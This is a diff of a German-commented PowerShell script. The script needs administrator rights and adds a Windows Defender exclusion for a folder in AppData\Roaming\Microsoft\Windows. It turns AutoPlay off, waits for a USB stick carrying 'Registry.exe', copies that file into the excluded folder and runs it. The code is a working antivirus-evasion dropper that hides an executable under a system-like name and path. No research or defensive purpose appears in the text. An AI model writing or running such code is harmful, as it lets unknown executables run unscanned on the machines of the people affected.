@@ -1,28 +1,31 @@
- # Prüfe, ob Skript mit Administratorrechten ausgeführt wird
+# Prüfe, ob Skript mit Administratorrechten ausgeführt wird
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Write-Warning "Bitte führe dieses Skript als Administrator aus."
     exit
 }
 
-# Zielverzeichnis für die Datei Registry.exe (im AppData-Pfad des aktuellen Benutzers)
-$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
+# Fester Zielordner
+$zielOrdner = "C:\Users\fusse\AppData\Roaming\Microsoft\Windows"
+
+# Erstelle Zielordner, falls nicht vorhanden
 if (-not (Test-Path $zielOrdner)) {
     Write-Host "Zielordner $zielOrdner wird erstellt..."
     New-Item -Path $zielOrdner -ItemType Directory -Force
 }
-sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 1
 
-# Defender-Ausnahme hinzufügen (nicht gefährlich, nützlich für Entwicklungs- und Testdateien)
+# AutoPlay deaktivieren
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" -Name DisableAutoplay -Value 1
+
+# Defender-Ausnahme hinzufügen
 Write-Host "Füge Windows Defender-Ausnahme für: $zielOrdner hinzu..."
 Add-MpPreference -ExclusionPath $zielOrdner
 
-# Warte auf das Einstecken eines USB-Sticks und kopiere Registry.exe, sobald vorhanden
+# Warte auf USB-Stick mit Registry.exe
 Write-Host "Warte auf das Einstecken eines USB-Sticks mit Registry.exe..."
 $registryGefunden = $false
 
 while (-not $registryGefunden) {
     Start-Sleep -Seconds 2
-
     $usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"
     foreach ($drive in $usbDrives) {
         $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
@@ -45,10 +48,11 @@ while (-not $registryGefunden) {
     }
 }
 
-sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 0
+# AutoPlay wieder aktivieren
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" -Name DisableAutoplay -Value 0
 
-# Datei ausführen (nur wenn erfolgreich kopiert)
-$ausfuehrPfad = Join-Path "C:\Users\fusse\AppData\Roaming\Microsoft\Windows" "Registry.exe"
+# Datei ausführen (fester Pfad)
+$ausfuehrPfad = "C:\Users\fusse\AppData\Roaming\Microsoft\Windows\Registry.exe"
 if (Test-Path $ausfuehrPfad) {
     Write-Host "Starte Registry.exe aus $ausfuehrPfad"
     Start-Process -FilePath $ausfuehrPfad
